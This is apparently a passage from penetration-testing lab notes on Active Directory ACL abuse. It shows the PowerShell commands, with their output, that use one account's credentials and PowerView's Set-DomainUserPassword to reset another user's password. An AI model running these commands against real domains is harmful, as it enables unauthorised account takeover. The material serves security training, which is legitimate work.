# STEP 1 IN ACL ABUSE EXAMPLE. USE CURRENT ACCOUNT TO CHANGE PASSWORD OF OTHER ACCOUNT
## Creating a PSCredential Object

```Powershell
PS C:\htb> $SecPassword = ConvertTo-SecureString '<wley Password>' -AsPlainText -Force
PS C:\htb> $Cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\wley', $SecPassword) 
```
Next, we must create a SecureString object which represents the password we want to set for the target user damundsen.
## Creating a SecureString Object

```Powershell
PS C:\htb> $damundsenPassword = ConvertTo-SecureString 'Pwn3d_by_ACLs!' -AsPlainText -Force
```

Finally, we'll use the Set-DomainUserPassword PowerView function to change the user's password. We need to use the -Credential flag with the credential object we created for the wley user. It's best to always specify the -Verbose flag to get feedback on the command completing as expected or as much information about errors as possible. We could do this from a Linux attack host using a tool such as pth-net, which is part of the pth-toolkit.
## Changing the User's Password

```Powershell
PS C:\htb> cd C:\Tools\
PS C:\htb> Import-Module .\PowerView.ps1
PS C:\htb> Set-DomainUserPassword -Identity damundsen -AccountPassword $damundsenPassword -Credential $Cred -Verbose

VERBOSE: [Get-PrincipalContext] Using alternate credentials
VERBOSE: [Set-DomainUserPassword] Attempting to set the password for user 'damundsen'
VERBOSE: [Set-DomainUserPassword] Password for user 'damundsen' successfully reset
```
